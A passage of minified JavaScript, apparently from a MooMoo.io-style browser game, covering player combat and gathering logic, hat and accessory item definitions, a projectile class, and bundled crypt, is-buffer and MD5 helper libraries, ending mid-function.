        if (this.xVel && (this.xVel *= Bs(i.playerDecel, k),
                          this.xVel <= .01 && this.xVel >= -.01 && (this.xVel = 0)),
            this.yVel && (this.yVel *= Bs(i.playerDecel, k),
                          this.yVel <= .01 && this.yVel >= -.01 && (this.yVel = 0)),
            this.x - this.scale < 0 ? this.x = this.scale : this.x + this.scale > i.mapScale && (this.x = i.mapScale - this.scale),
            this.y - this.scale < 0 ? this.y = this.scale : this.y + this.scale > i.mapScale && (this.y = i.mapScale - this.scale),
            this.buildIndex < 0) {
            if (this.reloads[this.weaponIndex] > 0)
                this.reloads[this.weaponIndex] -= k,
                    this.gathering = this.mouseState;
            else if (this.gathering || this.autoGather) {
                let _ = !0;
                if (c.weapons[this.weaponIndex].gather != null)
                    this.gather(o);
                else if (c.weapons[this.weaponIndex].projectile != null && this.hasRes(c.weapons[this.weaponIndex], this.skin ? this.skin.projCost : 0)) {
                    this.useRes(c.weapons[this.weaponIndex], this.skin ? this.skin.projCost : 0),
                        this.noMovTimer = 0;
                    var F = c.weapons[this.weaponIndex].projectile;
                    const V = this.scale * 2
                    , z = this.skin && this.skin.aMlt ? this.skin.aMlt : 1;
                    c.weapons[this.weaponIndex].rec && (this.xVel -= c.weapons[this.weaponIndex].rec * at(this.dir),
                                                        this.yVel -= c.weapons[this.weaponIndex].rec * lt(this.dir)),
                        n.addProjectile(this.x + V * at(this.dir), this.y + V * lt(this.dir), this.dir, c.projectiles[F].range * z, c.projectiles[F].speed * z, F, this, null, this.zIndex)
                } else
                    _ = !1;
                this.gathering = this.mouseState,
                    _ && (this.reloads[this.weaponIndex] = c.weapons[this.weaponIndex].speed * (this.skin && this.skin.atkSpd || 1))
            }
        }
    }
        ,
        this.addWeaponXP = function(k) {
        this.weaponXP[this.weaponIndex] || (this.weaponXP[this.weaponIndex] = 0),
            this.weaponXP[this.weaponIndex] += k
    }
        ,
        this.earnXP = function(k) {
        this.age < i.maxAge && (this.XP += k,
                                this.XP >= this.maxXP ? (this.age < i.maxAge ? (this.age++,
                                                                                this.XP = 0,
                                                                                this.maxXP *= 1.2) : this.XP = this.maxXP,
                                                         this.upgradePoints++,
                                                         p.send(this.id, "U", this.upgradePoints, this.upgrAge),
                                                         p.send(this.id, "T", this.XP, s.fixTo(this.maxXP, 1), this.age)) : p.send(this.id, "T", this.XP))
    }
        ,
        this.changeHealth = function(k, S) {
        if (k > 0 && this.health >= this.maxHealth)
            return !1;
        k < 0 && this.skin && (k *= this.skin.dmgMult || 1),
            k < 0 && this.tail && (k *= this.tail.dmgMult || 1),
            k < 0 && (this.hitTime = Date.now()),
            this.health += k,
            this.health > this.maxHealth && (k -= this.health - this.maxHealth,
                                             this.health = this.maxHealth),
            this.health <= 0 && this.kill(S);
        for (let O = 0; O < o.length; ++O)
            this.sentTo[o[O].id] && p.send(o[O].id, "O", this.sid, this.health);
        return S && S.canSee(this) && !(S == this && k < 0) && p.send(S.id, "8", round(this.x), round(this.y), round(-k), 1),
            !0
    }
        ,
        this.kill = function(k) {
        k && k.alive && (k.kills++,
                         k.skin && k.skin.goldSteal ? h(k, round(this.points / 2)) : h(k, round(this.age * 100 * (k.skin && k.skin.kScrM ? k.skin.kScrM : 1))),
                         p.send(k.id, "N", "kills", k.kills, 1)),
            this.alive = !1,
            p.send(this.id, "P"),
            m()
    }
        ,
        this.addResource = function(k, S, O) {
        !O && S > 0 && this.addWeaponXP(S),
            k == 3 ? h(this, S, !0) : (this[i.resourceTypes[k]] += S,
                                       p.send(this.id, "N", i.resourceTypes[k], this[i.resourceTypes[k]], 1))
    }
        ,
        this.changeItemCount = function(k, S) {
        this.itemCounts[k] = this.itemCounts[k] || 0,
            this.itemCounts[k] += S,
            p.send(this.id, "S", k, this.itemCounts[k])
    }
        ,
        this.buildItem = function(k) {
        const S = this.scale + k.scale + (k.placeOffset || 0)
        , O = this.x + S * at(this.dir)
        , U = this.y + S * lt(this.dir);
        if (this.canBuild(k) && !(k.consume && this.skin && this.skin.noEat) && (k.consume || r.checkItemLocation(O, U, k.scale, .6, k.id, !1, this))) {
            let L = !1;
            if (k.consume) {
                if (this.hitTime) {
                    const q = Date.now() - this.hitTime;
                    this.hitTime = 0,
                        q <= 120 ? (this.shameCount++,
                                    this.shameCount >= 8 && (this.shameTimer = 3e4,
                                                             this.shameCount = 0)) : (this.shameCount -= 2,
                                                                                      this.shameCount <= 0 && (this.shameCount = 0))
                }
                this.shameTimer <= 0 && (L = k.consume(this))
            } else
                L = !0,
                    k.group.limit && this.changeItemCount(k.group.id, 1),
                    k.pps && (this.pps += k.pps),
                    r.add(r.objects.length, O, U, this.dir, k.scale, k.type, k, !1, this);
            L && (this.useRes(k),
                  this.buildIndex = -1)
        }
    }
        ,
        this.hasRes = function(k, S) {
        for (let O = 0; O < k.req.length; ) {
            if (this[k.req[O]] < round(k.req[O + 1] * (S || 1)))
                return !1;
            O += 2
        }
        return !0
    }
        ,
        this.useRes = function(k, S) {
        if (!i.inSandbox)
            for (let O = 0; O < k.req.length; )
                this.addResource(i.resourceTypes.indexOf(k.req[O]), -round(k.req[O + 1] * (S || 1))),
                    O += 2
    }
        ,
        this.canBuild = function(k) {
        const S = sandbox ? k.group.sandboxLimit || max(k.group.limit * 3, 99) : k.group.limit;
        return S && this.itemCounts[k.group.id] >= S ? !1 : sandbox ? !0 : this.hasRes(k)
    }
        ,
        this.gather = function() {
        this.noMovTimer = 0,
            this.slowMult -= c.weapons[this.weaponIndex].hitSlow || .3,
            this.slowMult < 0 && (this.slowMult = 0);
        const k = i.fetchVariant(this)
        , S = k.poison
        , O = k.val
        , U = {};
        let L, q, P, W;
        const F = r.getGridArrays(this.x, this.y, c.weapons[this.weaponIndex].range);
        for (let $ = 0; $ < F.length; ++$)
            for (var _ = 0; _ < F[$].length; ++_)
                if (P = F[$][_],
                    P.active && !P.dontGather && !U[P.sid] && P.visibleToPlayer(this) && (L = s.getDistance(this.x, this.y, P.x, P.y) - P.scale,
                                                                                          L <= c.weapons[this.weaponIndex].range && (q = s.getAimerection(P.x, P.y, this.x, this.y),
                                                                                                                                     s.getAngleDist(q, this.dir) <= i.gatherAngle))) {
                    if (U[P.sid] = 1,
                        P.health) {
                        if (P.changeHealth(-c.weapons[this.weaponIndex].dmg * O * (c.weapons[this.weaponIndex].sDmg || 1) * (this.skin && this.skin.bDmg ? this.skin.bDmg : 1), this)) {
                            for (let V = 0; V < P.req.length; )
                                this.addResource(i.resourceTypes.indexOf(P.req[V]), P.req[V + 1]),
                                    V += 2;
                            r.disableObj(P)
                        }
                    } else {
                        if (P.name === "volcano")
                            this.hitVolcano(c.weapons[this.weaponIndex].gather);
                        else {
                            this.earnXP(4 * c.weapons[this.weaponIndex].gather);
                            const V = c.weapons[this.weaponIndex].gather + (P.type == 3 ? 4 : 0);
                            this.addResource(P.type, V)
                        }
                        this.skin && this.skin.extraGold && this.addResource(3, 1)
                    }
                    W = !0,
                        r.hitObj(P, q)
                }
        for (var _ = 0; _ < o.length + l.length; ++_)
            if (P = o[_] || l[_ - o.length],
                P != this && P.alive && !(P.team && P.team == this.team) && (L = s.getDistance(this.x, this.y, P.x, P.y) - P.scale * 1.8,
                                                                             L <= c.weapons[this.weaponIndex].range && (q = s.getAimerection(P.x, P.y, this.x, this.y),
                                                                                                                        s.getAngleDist(q, this.dir) <= i.gatherAngle))) {
                let V = c.weapons[this.weaponIndex].steal;
                V && P.addResource && (V = min(P.points || 0, V),
                                       this.addResource(3, V),
                                       P.addResource(3, -V));
                let z = O;
                P.weaponIndex != null && c.weapons[P.weaponIndex].shield && s.getAngleDist(q + PI, P.dir) <= i.shieldAngle && (z = c.weapons[P.weaponIndex].shield);
                const X = c.weapons[this.weaponIndex].dmg
                , G = X * (this.skin && this.skin.dmgMultO ? this.skin.dmgMultO : 1) * (this.tail && this.tail.dmgMultO ? this.tail.dmgMultO : 1)
                , te = .3 * (P.weightM || 1) + (c.weapons[this.weaponIndex].knock || 0);
                P.xVel += te * at(q),
                    P.yVel += te * lt(q),
                    this.skin && this.skin.healD && this.changeHealth(G * z * this.skin.healD, this),
                    this.tail && this.tail.healD && this.changeHealth(G * z * this.tail.healD, this),
                    P.skin && P.skin.dmg && this.changeHealth(-X * P.skin.dmg, P),
                    P.tail && P.tail.dmg && this.changeHealth(-X * P.tail.dmg, P),
                    P.dmgOverTime && this.skin && this.skin.poisonDmg && !(P.skin && P.skin.poisonRes) && (P.dmgOverTime.dmg = this.skin.poisonDmg,
                                                                                                           P.dmgOverTime.time = this.skin.poisonTime || 1,
                                                                                                           P.dmgOverTime.doer = this),
                    P.dmgOverTime && S && !(P.skin && P.skin.poisonRes) && (P.dmgOverTime.dmg = 5,
                                                                            P.dmgOverTime.time = 5,
                                                                            P.dmgOverTime.doer = this),
                    P.skin && P.skin.dmgK && (this.xVel -= P.skin.dmgK * at(q),
                                              this.yVel -= P.skin.dmgK * lt(q)),
                    P.changeHealth(-G * z, this, this)
            }
        this.sendAnimation(W ? 1 : 0)
    }
        ,
        this.hitVolcano = function(k) {
        const S = 5 + round(k / 3.5);
        this.addResource(2, S),
            this.addResource(3, S)
    }
        ,
        this.sendAnimation = function(k) {
        for (let S = 0; S < o.length; ++S)
            this.sentTo[o[S].id] && this.canSee(o[S]) && p.send(o[S].id, "K", this.sid, k ? 1 : 0, this.weaponIndex)
    }
    ;
    let x = 0
    , D = 0;
    this.animate = function(k) {
        this.animTime > 0 && (this.animTime -= k,
                              this.animTime <= 0 ? (this.animTime = 0,
                                                    this.dirPlus = 0,
                                                    x = 0,
                                                    D = 0) : D == 0 ? (x += k / (this.animSpeed * i.hitReturnRatio),
                                                                       this.dirPlus = s.lerp(0, this.targetAngle, min(1, x)),
                                                                       x >= 1 && (x = 1,
                                                                                  D = 1)) : (x -= k / (this.animSpeed * (1 - i.hitReturnRatio)),
                                                                                             this.dirPlus = s.lerp(0, this.targetAngle, max(0, x))))
    }
        ,
        this.startAnim = function(k, S) {
        this.animTime = this.animSpeed = c.weapons[S].speed,
            this.targetAngle = k ? -i.hitAngle : -PI,
            x = 0,
            D = 0
    }
        ,
        this.canSee = function(k) {
        if (!k || k.skin && k.skin.invisTimer && k.noMovTimer >= k.skin.invisTimer)
            return !1;
        const S = _s(k.x - this.x) - k.scale
        , O = _s(k.y - this.y) - k.scale;
        return S <= i.maxScreenWidth / 2 * 1.3 && O <= i.maxScreenHeight / 2 * 1.3
    }
}
const Bc = [{
    id: 45,
    name: "Shame!",
    dontSell: !0,
    price: 0,
    scale: 120,
    desc: "hacks are for losers"
}, {
    id: 51,
    name: "Moo Cap",
    price: 0,
    scale: 120,
    desc: "coolest mooer around"
}, {
    id: 50,
    name: "Apple Cap",
    price: 0,
    scale: 120,
    desc: "apple farms remembers"
}, {
    id: 28,
    name: "Moo Head",
    price: 0,
    scale: 120,
    desc: "no effect"
}, {
    id: 29,
    name: "Pig Head",
    price: 0,
    scale: 120,
    desc: "no effect"
}, {
    id: 30,
    name: "Fluff Head",
    price: 0,
    scale: 120,
    desc: "no effect"
}, {
    id: 36,
    name: "Pandou Head",
    price: 0,
    scale: 120,
    desc: "no effect"
}, {
    id: 37,
    name: "Bear Head",
    price: 0,
    scale: 120,
    desc: "no effect"
}, {
    id: 38,
    name: "Monkey Head",
    price: 0,
    scale: 120,
    desc: "no effect"
}, {
    id: 44,
    name: "Polar Head",
    price: 0,
    scale: 120,
    desc: "no effect"
}, {
    id: 35,
    name: "Fez Hat",
    price: 0,
    scale: 120,
    desc: "no effect"
}, {
    id: 42,
    name: "Enigma Hat",
    price: 0,
    scale: 120,
    desc: "join the enigma army"
}, {
    id: 43,
    name: "Blitz Hat",
    price: 0,
    scale: 120,
    desc: "hey everybody i'm blitz"
}, {
    id: 49,
    name: "Bob XIII Hat",
    price: 0,
    scale: 120,
    desc: "like and subscribe"
}, {
    id: 57,
    name: "Pumpkin",
    price: 50,
    scale: 120,
    desc: "Spooooky"
}, {
    id: 8,
    name: "Bummle Hat",
    price: 100,
    scale: 120,
    desc: "no effect"
}, {
    id: 2,
    name: "Straw Hat",
    price: 500,
    scale: 120,
    desc: "no effect"
}, {
    id: 15,
    name: "Winter Cap",
    price: 600,
    scale: 120,
    desc: "allows you to move at normal speed in snow",
    coldM: 1
}, {
    id: 5,
    name: "Cowboy Hat",
    price: 1e3,
    scale: 120,
    desc: "no effect"
}, {
    id: 4,
    name: "Ranger Hat",
    price: 2e3,
    scale: 120,
    desc: "no effect"
}, {
    id: 18,
    name: "Explorer Hat",
    price: 2e3,
    scale: 120,
    desc: "no effect"
}, {
    id: 31,
    name: "Flipper Hat",
    price: 2500,
    scale: 120,
    desc: "have more control while in water",
    watrImm: !0
}, {
    id: 1,
    name: "Marksman Cap",
    price: 3e3,
    scale: 120,
    desc: "increases arrow speed and range",
    aMlt: 1.3
}, {
    id: 10,
    name: "Bush Gear",
    price: 3e3,
    scale: 160,
    desc: "allows you to disguise yourself as a bush"
}, {
    id: 48,
    name: "Halo",
    price: 3e3,
    scale: 120,
    desc: "no effect"
}, {
    id: 6,
    name: "Soldier Helmet",
    price: 4e3,
    scale: 120,
    desc: "reduces damage taken but slows movement",
    spdMult: .94,
    dmgMult: .75
}, {
    id: 23,
    name: "Anti Venom Gear",
    price: 4e3,
    scale: 120,
    desc: "makes you immune to poison",
    poisonRes: 1
}, {
    id: 13,
    name: "Medic Gear",
    price: 5e3,
    scale: 110,
    desc: "slowly regenerates health over time",
    healthRegen: 3
}, {
    id: 9,
    name: "Miners Helmet",
    price: 5e3,
    scale: 120,
    desc: "earn 1 extra gold per resource",
    extraGold: 1
}, {
    id: 32,
    name: "Musketeer Hat",
    price: 5e3,
    scale: 120,
    desc: "reduces cost of projectiles",
    projCost: .5
}, {
    id: 7,
    name: "Bull Helmet",
    price: 6e3,
    scale: 120,
    desc: "increases damage done but drains health",
    healthRegen: -5,
    dmgMultO: 1.5,
    spdMult: .96
}, {
    id: 22,
    name: "Emp Helmet",
    price: 6e3,
    scale: 120,
    desc: "turrets won't attack but you move slower",
    antiTurret: 1,
    spdMult: .7
}, {
    id: 12,
    name: "Booster Hat",
    price: 6e3,
    scale: 120,
    desc: "increases your movement speed",
    spdMult: 1.16
}, {
    id: 26,
    name: "Barbarian Armor",
    price: 8e3,
    scale: 120,
    desc: "knocks back enemies that attack you",
    dmgK: .6
}, {
    id: 21,
    name: "Plague Mask",
    price: 1e4,
    scale: 120,
    desc: "melee attacks deal poison damage",
    poisonDmg: 5,
    poisonTime: 6
}, {
    id: 46,
    name: "Bull Mask",
    price: 1e4,
    scale: 120,
    desc: "bulls won't target you unless you attack them",
    bullRepel: 1
}, {
    id: 14,
    name: "Windmill Hat",
    topSprite: !0,
    price: 1e4,
    scale: 120,
    desc: "generates points while worn",
    pps: 1.5
}, {
    id: 11,
    name: "Spike Gear",
    topSprite: !0,
    price: 1e4,
    scale: 120,
    desc: "deal damage to players that damage you",
    dmg: .45
}, {
    id: 53,
    name: "Turret Gear",
    topSprite: !0,
    price: 1e4,
    scale: 120,
    desc: "you become a walking turret",
    turret: {
        proj: 1,
        range: 700,
        rate: 2500
    },
    spdMult: .7
}, {
    id: 20,
    name: "Samurai Armor",
    price: 12e3,
    scale: 120,
    desc: "increased attack speed and fire rate",
    atkSpd: .78
}, {
    id: 58,
    name: "Dark Knight",
    price: 12e3,
    scale: 120,
    desc: "restores health when you deal damage",
    healD: .4
}, {
    id: 27,
    name: "Scavenger Gear",
    price: 15e3,
    scale: 120,
    desc: "earn double points for each kill",
    kScrM: 2
}, {
    id: 40,
    name: "Tank Gear",
    price: 15e3,
    scale: 120,
    desc: "increased damage to buildings but slower movement",
    spdMult: .3,
    bDmg: 3.3
}, {
    id: 52,
    name: "Thief Gear",
    price: 15e3,
    scale: 120,
    desc: "steal half of a players gold when you kill them",
    goldSteal: .5
}, {
    id: 55,
    name: "Bloodthirster",
    price: 2e4,
    scale: 120,
    desc: "Restore Health when dealing damage. And increased damage",
    healD: .25,
    dmgMultO: 1.2
}, {
    id: 56,
    name: "Assassin Gear",
    price: 2e4,
    scale: 120,
    desc: "Go invisible when not moving. Can't eat. Increased speed",
    noEat: !0,
    spdMult: 1.1,
    invisTimer: 1e3
}]
, zc = [{
    id: 12,
    name: "Snowball",
    price: 1e3,
    scale: 105,
    xOff: 18,
    desc: "no effect"
}, {
    id: 9,
    name: "Tree Cape",
    price: 1e3,
    scale: 90,
    desc: "no effect"
}, {
    id: 10,
    name: "Stone Cape",
    price: 1e3,
    scale: 90,
    desc: "no effect"
}, {
    id: 3,
    name: "Cookie Cape",
    price: 1500,
    scale: 90,
    desc: "no effect"
}, {
    id: 8,
    name: "Cow Cape",
    price: 2e3,
    scale: 90,
    desc: "no effect"
}, {
    id: 11,
    name: "Monkey Tail",
    price: 2e3,
    scale: 97,
    xOff: 25,
    desc: "Super speed but reduced damage",
    spdMult: 1.35,
    dmgMultO: .2
}, {
    id: 17,
    name: "Apple Basket",
    price: 3e3,
    scale: 80,
    xOff: 12,
    desc: "slowly regenerates health over time",
    healthRegen: 1
}, {
    id: 6,
    name: "Winter Cape",
    price: 3e3,
    scale: 90,
    desc: "no effect"
}, {
    id: 4,
    name: "Skull Cape",
    price: 4e3,
    scale: 90,
    desc: "no effect"
}, {
    id: 5,
    name: "Dash Cape",
    price: 5e3,
    scale: 90,
    desc: "no effect"
}, {
    id: 2,
    name: "Dragon Cape",
    price: 6e3,
    scale: 90,
    desc: "no effect"
}, {
    id: 1,
    name: "Super Cape",
    price: 8e3,
    scale: 90,
    desc: "no effect"
}, {
    id: 7,
    name: "Troll Cape",
    price: 8e3,
    scale: 90,
    desc: "no effect"
}, {
    id: 14,
    name: "Thorns",
    price: 1e4,
    scale: 115,
    xOff: 20,
    desc: "no effect"
}, {
    id: 15,
    name: "Blockades",
    price: 1e4,
    scale: 95,
    xOff: 15,
    desc: "no effect"
}, {
    id: 20,
    name: "Devils Tail",
    price: 1e4,
    scale: 95,
    xOff: 20,
    desc: "no effect"
}, {
    id: 16,
    name: "Sawblade",
    price: 12e3,
    scale: 90,
    spin: !0,
    xOff: 0,
    desc: "deal damage to players that damage you",
    dmg: .15
}, {
    id: 13,
    name: "Angel Wings",
    price: 15e3,
    scale: 138,
    xOff: 22,
    desc: "slowly regenerates health over time",
    healthRegen: 3
}, {
    id: 19,
    name: "Shadow Wings",
    price: 15e3,
    scale: 138,
    xOff: 22,
    desc: "increased movement speed",
    spdMult: 1.1
}, {
    id: 18,
    name: "Blood Wings",
    price: 2e4,
    scale: 178,
    xOff: 26,
    desc: "restores health when you deal damage",
    healD: .2
}, {
    id: 21,
    name: "Corrupt X Wings",
    price: 2e4,
    scale: 178,
    xOff: 26,
    desc: "deal damage to players that damage you",
    dmg: .25
}]
, $r = {
    hats: Bc,
    accessories: zc
};
function Hc(e, t, i, s, n, r, o) {
    this.init = function(a, u, p, h, m, w, v, x, D) {
        this.active = !0,
            this.indx = a,
            this.x = u,
            this.y = p,
            this.dir = h,
            this.skipMov = !0,
            this.speed = m,
            this.dmg = w,
            this.scale = x,
            this.range = v,
            this.owner = D,
            o && (this.sentTo = {})
    }
    ;
    const l = [];
    let c;
    this.update = function(a) {
        if (this.active) {
            let p = this.speed * a, h;
            if (this.skipMov ? this.skipMov = !1 : (this.x += p * cos(this.dir),
                                                    this.y += p * sin(this.dir),
                                                    this.range -= p,
                                                    this.range <= 0 && (this.x += this.range * cos(this.dir),
                                                                        this.y += this.range * sin(this.dir),
                                                                        p = 1,
                                                                        this.range = 0,
                                                                        this.active = !1)),
                o) {
                for (var u = 0; u < e.length; ++u)
                    !this.sentTo[e[u].id] && e[u].canSee(this) && (this.sentTo[e[u].id] = 1,
                                                                   o.send(e[u].id, "X", r.fixTo(this.x, 1), r.fixTo(this.y, 1), r.fixTo(this.dir, 2), r.fixTo(this.range, 1), this.speed, this.indx, this.layer, this.sid));
                l.length = 0;
                for (var u = 0; u < e.length + t.length; ++u)
                    c = e[u] || t[u - e.length],
                        c.alive && c != this.owner && !(this.owner.team && c.team == this.owner.team) && r.lineInRect(c.x - c.scale, c.y - c.scale, c.x + c.scale, c.y + c.scale, this.x, this.y, this.x + p * cos(this.dir), this.y + p * sin(this.dir)) && l.push(c);
                const m = i.getGridArrays(this.x, this.y, this.scale);
                for (let w = 0; w < m.length; ++w)
                    for (let v = 0; v < m[w].length; ++v)
                        c = m[w][v],
                            h = c.getScale(),
                            c.active && this.ignoreObj != c.sid && this.layer <= c.layer && l.indexOf(c) < 0 && !c.ignoreCollision && r.lineInRect(c.x - h, c.y - h, c.x + h, c.y + h, this.x, this.y, this.x + p * cos(this.dir), this.y + p * sin(this.dir)) && l.push(c);
                if (l.length > 0) {
                    let w = null
                    , v = null
                    , x = null;
                    for (var u = 0; u < l.length; ++u)
                        x = r.getDistance(this.x, this.y, l[u].x, l[u].y),
                            (v == null || x < v) && (v = x,
                                                     w = l[u]);
                    if (w.isPlayer || w.isAI) {
                        const D = .3 * (w.weightM || 1);
                        w.xVel += D * cos(this.dir),
                            w.yVel += D * sin(this.dir),
                            (w.weaponIndex == null || !(s.weapons[w.weaponIndex].shield && r.getAngleDist(this.dir + PI, w.dir) <= n.shieldAngle)) && w.changeHealth(-this.dmg, this.owner, this.owner)
                    } else {
                        w.projDmg && w.health && w.changeHealth(-this.dmg) && i.disableObj(w);
                        for (var u = 0; u < e.length; ++u)
                            e[u].active && (w.sentTo[e[u].id] && (w.active ? e[u].canSee(w) && o.send(e[u].id, "L", r.fixTo(this.dir, 2), w.sid) : o.send(e[u].id, "Q", w.sid)),
                                            !w.active && w.owner == e[u] && e[u].changeItemCount(w.group.id, -1))
                    }
                    this.active = !1;
                    for (var u = 0; u < e.length; ++u)
                        this.sentTo[e[u].id] && o.send(e[u].id, "Y", this.sid, r.fixTo(v, 1))
                }
            }
        }
    }
}
var On = {}
, Fc = {
    get exports() {
        return On
    },
    set exports(e) {
        On = e
    }
}
, Rn = {}
, Vc = {
    get exports() {
        return Rn
    },
    set exports(e) {
        Rn = e
    }
};
(function() {
    var e = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    , t = {
        rotl: function(i, s) {
            return i << s | i >>> 32 - s
        },
        rotr: function(i, s) {
            return i << 32 - s | i >>> s
        },
        endian: function(i) {
            if (i.constructor == Number)
                return t.rotl(i, 8) & 16711935 | t.rotl(i, 24) & 4278255360;
            for (var s = 0; s < i.length; s++)
                i[s] = t.endian(i[s]);
            return i
        },
        randomBytes: function(i) {
            for (var s = []; i > 0; i--)
                s.push(floor(Math.random() * 256));
            return s
        },
        bytesToWords: function(i) {
            for (var s = [], n = 0, r = 0; n < i.length; n++,
                 r += 8)
                s[r >>> 5] |= i[n] << 24 - r % 32;
            return s
        },
        wordsToBytes: function(i) {
            for (var s = [], n = 0; n < i.length * 32; n += 8)
                s.push(i[n >>> 5] >>> 24 - n % 32 & 255);
            return s
        },
        bytesToHex: function(i) {
            for (var s = [], n = 0; n < i.length; n++)
                s.push((i[n] >>> 4).toString(16)),
                    s.push((i[n] & 15).toString(16));
            return s.join("")
        },
        hexToBytes: function(i) {
            for (var s = [], n = 0; n < i.length; n += 2)
                s.push(parseInt(i.substr(n, 2), 16));
            return s
        },
        bytesToBase64: function(i) {
            for (var s = [], n = 0; n < i.length; n += 3)
                for (var r = i[n] << 16 | i[n + 1] << 8 | i[n + 2], o = 0; o < 4; o++)
                    n * 8 + o * 6 <= i.length * 8 ? s.push(e.charAt(r >>> 6 * (3 - o) & 63)) : s.push("=");
            return s.join("")
        },
        base64ToBytes: function(i) {
            i = i.replace(/[^A-Z0-9+\/]/ig, "");
            for (var s = [], n = 0, r = 0; n < i.length; r = ++n % 4)
                r != 0 && s.push((e.indexOf(i.charAt(n - 1)) & pow(2, -2 * r + 8) - 1) << r * 2 | e.indexOf(i.charAt(n)) >>> 6 - r * 2);
            return s
        }
    };
    Vc.exports = t
}
)();
var _n = {
    utf8: {
        stringToBytes: function(e) {
            return _n.bin.stringToBytes(unescape(encodeURIComponent(e)))
        },
        bytesToString: function(e) {
            return decodeURIComponent(escape(_n.bin.bytesToString(e)))
        }
    },
    bin: {
        stringToBytes: function(e) {
            for (var t = [], i = 0; i < e.length; i++)
                t.push(e.charCodeAt(i) & 255);
            return t
        },
        bytesToString: function(e) {
            for (var t = [], i = 0; i < e.length; i++)
                t.push(String.fromCharCode(e[i]));
            return t.join("")
        }
    }
}
, zs = _n;
/*!
 * Determine if an object is a Buffer
 *
 * @author   Feross Aboukhadijeh <https://feross.org>
 * @license  MIT
 */
var Uc = function(e) {
    return e != null && (Kr(e) || Lc(e) || !!e._isBuffer)
};
function Kr(e) {
    return !!e.constructor && typeof e.constructor.isBuffer == "function" && e.constructor.isBuffer(e)
}
function Lc(e) {
    return typeof e.readFloatLE == "function" && typeof e.slice == "function" && Kr(e.slice(0, 0))
}
(function() {
    var e = Rn
    , t = zs.utf8
    , i = Uc
    , s = zs.bin
    , n = function(r, o) {
        r.constructor == String ? o && o.encoding === "binary" ? r = s.stringToBytes(r) : r = t.stringToBytes(r) : i(r) ? r = Array.prototype.slice.call(r, 0) : !Array.isArray(r) && r.constructor !== Uint8Array && (r = r.toString());
        for (var l = e.bytesToWords(r), c = r.length * 8, a = 1732584193, u = -271733879, p = -1732584194, h = 271733878, m = 0; m < l.length; m++)
            l[m] = (l[m] << 8 | l[m] >>> 24) & 16711935 | (l[m] << 24 | l[m] >>> 8) & 4278255360;
        l[c >>> 5] |= 128 << c % 32,
            l[(c + 64 >>> 9 << 4) + 14] = c;
        for (var w = n._ff, v = n._gg, x = n._hh, D = n._ii, m = 0; m < l.length; m += 16) {
            var k = a
            , S = u
            , O = p
            , U = h;
            a = w(a, u, p, h, l[m + 0], 7, -680876936),
                h = w(h, a, u, p, l[m + 1], 12, -389564586),
                p = w(p, h, a, u, l[m + 2], 17, 606105819),
                u = w(u, p, h, a, l[m + 3], 22, -1044525330),
                a = w(a, u, p, h, l[m + 4], 7, -176418897),
                h = w(h, a, u, p, l[m + 5], 12, 1200080426),
                p = w(p, h, a, u, l[m + 6], 17, -1473231341),
                u = w(u, p, h, a, l[m + 7], 22, -45705983),
                a = w(a, u, p, h, l[m + 8], 7, 1770035416),
                h = w(h, a, u, p, l[m + 9], 12, -1958414417),
                p = w(p, h, a, u, l[m + 10], 17, -42063),
                u = w(u, p, h, a, l[m + 11], 22, -1990404162),
                a = w(a, u, p, h, l[m + 12], 7, 1804603682),
                h = w(h, a, u, p, l[m + 13], 12, -40341101),
                p = w(p, h, a, u, l[m + 14], 17, -1502002290),
                u = w(u, p, h, a, l[m + 15], 22, 1236535329),
                a = v(a, u, p, h, l[m + 1], 5, -165796510),
                h = v(h, a, u, p, l[m + 6], 9, -1069501632),
                p = v(p, h, a, u, l[m + 11], 14, 643717713),
                u = v(u, p, h, a, l[m + 0], 20, -373897302),
                a = v(a, u, p, h, l[m + 5], 5, -701558691),
                h = v(h, a, u, p, l[m + 10], 9, 38016083),
                p = v(p, h, a, u, l[m + 15], 14, -660478335),
                u = v(u, p, h, a, l[m + 4], 20, -405537848),
                a = v(a, u, p, h, l[m + 9], 5, 568446438),
                h = v(h, a, u, p, l[m + 14], 9, -1019803690),
                p = v(p, h, a, u, l[m + 3], 14, -187363961),
                u = v(u, p, h, a, l[m + 8], 20, 1163531501),
                a = v(a, u, p, h, l[m + 13], 5, -1444681467),
                h = v(h, a, u, p, l[m + 2], 9, -51403784),
                p = v(p, h, a, u, l[m + 7], 14, 1735328473),
                u = v(u, p, h, a, l[m + 12], 20, -1926607734),
                a = x(a, u, p, h, l[m + 5], 4, -378558),
                h = x(h, a, u, p, l[m + 8], 11, -2022574463),
                p = x(p, h, a, u, l[m + 11], 16, 1839030562),
                u = x(u, p, h, a, l[m + 14], 23, -35309556),
                a = x(a, u, p, h, l[m + 1], 4, -1530992060),
                h = x(h, a, u, p, l[m + 4], 11, 1272893353),
                p = x(p, h, a, u, l[m + 7], 16, -155497632),
                u = x(u, p, h, a, l[m + 10], 23, -1094730640),
                a = x(a, u, p, h, l[m + 13], 4, 681279174),
                h = x(h, a, u, p, l[m + 0], 11, -358537222),
                p = x(p, h, a, u, l[m + 3], 16, -722521979),
                u = x(u, p, h, a, l[m + 6], 23, 76029189),
                a = x(a, u, p, h, l[m + 9], 4, -640364487),
                h = x(h, a, u, p, l[m + 12], 11, -421815835),
                p = x(p, h, a, u, l[m + 15], 16, 530742520),
                u = x(u, p, h, a, l[m + 2], 23, -995338651),
                a = D(a, u, p, h, l[m + 0], 6, -198630844),
                h = D(h, a, u, p, l[m + 7], 10, 1126891415),
                p = D(p, h, a, u, l[m + 14], 15, -1416354905),
                u = D(u, p, h, a, l[m + 5], 21, -57434055),
                a = D(a, u, p, h, l[m + 12], 6, 1700485571),
                h = D(h, a, u, p, l[m + 3], 10, -1894986606),
                p = D(p, h, a, u, l[m + 10], 15, -1051523),
                u = D(u, p, h, a, l[m + 1], 21, -2054922799),
                a = D(a, u, p, h, l[m + 8], 6, 1873313359),
                h = D(h, a, u, p, l[m + 15], 10, -30611744),
                p = D(p, h, a, u, l[m + 6], 15, -1560198380),
                u = D(u, p, h, a, l[m + 13], 21, 1309151649),
                a = D(a, u, p, h, l[m + 4], 6, -145523070),
                h = D(h, a, u, p, l[m + 11], 10, -1120210379),
                p = D(p, h, a, u, l[m + 2], 15, 718787259),
                u = D(u, p, h, a, l[m + 9], 21, -343485551),
                a = a + k >>> 0,
                u = u + S >>> 0,
                p = p + O >>> 0,
                h = h + U >>> 0
        }
        return e.endian([a, u, p, h])
    };
    n._ff = function(r, o, l, c, a, u, p) {
        var h = r + (o & l | ~o & c) + (a >>> 0) + p;
